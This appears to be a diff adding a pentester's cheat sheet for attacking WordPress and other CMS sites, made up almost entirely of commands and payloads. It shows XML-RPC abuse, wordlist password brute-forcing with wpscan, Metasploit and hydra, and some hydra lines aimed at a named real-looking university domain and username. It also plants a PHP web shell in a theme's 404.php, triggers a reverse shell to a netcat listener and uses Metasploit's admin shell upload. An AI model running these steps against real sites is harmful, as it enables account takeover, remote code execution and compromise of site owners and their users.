@@ -1,0 +1,137 @@
+WordPress for Pentesters : https://www.udemy.com/course/wordpress-for-pentesters/
+
+* Finding Hidden Directories:
+
+Download this https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt this Wordlists
+
+gobuster dir -u <link> -t 20 -w /home/kali/tools/wordlists/wordpress.fuzz.txt
+dirsearch -u <link>  -w /home/kali/tools/wordlists/wordpress.fuzz.txt
+
+* Use wpscan
+wpscan --url <Link> -e p,t,u
+
+* xmlrpc.php
+
+
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+<methodCall>
+<methodName>demo.sayHello</methodName>
+<params></params>
+</methodCall>
+
+<methodCall>
+<methodName>wp.getUsersBlogs</methodName>
+<params>
+<param><value>admin</value></param>
+<param><value>pass</value></param>
+</params>
+</methodCall>
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://<YOUR SERVER >:<port></string></value>
+</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
+</value></param></params>
+</methodCall>
+
+wpscan --password-attack xmlrpc -U <userid> -P /home/kali/tools/wordlists/rockyou.txt --url <link>
+
+use auxiliary/scanner/http/wordpress_scanner
+info
+set TARGETURI /wordpress
+set RHOSTS <website ip>
+set RPORT <website port>
+
+msfconsole
+search wordpress
+search type:auxiliary wordpress xmlrpc
+use auxiliary/scanner/http/wordpress_xmlrpc_login 
+show options
+set RHOSTS <website ip>
+set RPORT <website port>
+set STOP_ON_SUCCESS true
+show options
+set TARGETURI /wordpress
+set USERNAME <username>
+set PASS_FILE <pass file>
+show options
+run
+
+msfconsole
+search wordpress
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set USERNAME <username>
+set PASS_FILE <pass file>
+set RHOSTS <website ip>
+set RPORT <website port>
+set STOP_ON_SUCCESS true
+set TARGETURI /wordpress
+run
+
+
+hydra -l admin -P /home/kali/tools/wordlists/rockyou.txt <ipadd of site> http-post-form "/wp-login.php:log=^USER^$pwd=^PASS^&wp-submit=Log+In:The password you entered for the username admin is incorrect" -t 10
+
+hydra -l akram -P rockyou.txt www.uiu.ac.bd http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username akram is incorrect." -t 10
+
+hydra -l akram -P rockyou.txt www.uiu.ac.bd http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username akram is incorrect." -t 10
+hydra -l akram -P rockyou.txt www.uiu.ac.bd http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR" -t 10
+
+First go to tools > theme file editor or wordpress/wp-admin/theme-editor.php
+then edit the file <?php system($_GET["cmd"]) ?>
+File Path : wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen
+Then Trigger : wordpress/wp-content/themes/twentyfifteen/404.php?cmd=whoami
+
+
+then go to kali
+cd tools/reverse-shells
+cat pythonrev.py
+nc -nvlp <port>
+then paste the script  : wordpress/wp-content/themes/twentyfifteen/404.php?cmd= python [pythonrev.py]
+stty raw -echo;fg
+
+msfconsole
+search wordpress shell
+use exploit/unix/webapp/wp_admin_shell_upload
+show options
+set PASSWORD <admin password>
+set USERNAME <admin username>
+set RHOSTS <ip>
+show options
+run [if failed]
+show advance
+set WPCHECK false
+run
+
+curl <ip/website> | grep -i generator [you can find the CMS name]
+searchsploit <CMS name>
+searchsploit <CMS name> | grep -v Denial | grep -v Cross
+
+
+apt-get install python-pip
+pip3 install droopescan
+
+git clone https://github.com/droope/droopescan.git
+cd droopescan
+pip install -r requirements.txt
+./droopescan scan --help
+
+droopescan scan drupal -u example.org
+droopescan scan drupal -U list_of_urls.txt
+
+droopescan scan -u example.org
+droopescan scan -U list_of_urls.txt
+
+droopescan scan joomla -u example.org
+
+Online tool : https://hackertarget.com/drupal-security-scan/
+Source : https://cheatsheet.haax.fr/web-pentest/content-management-system-cms/drupal/
+
+
+
+
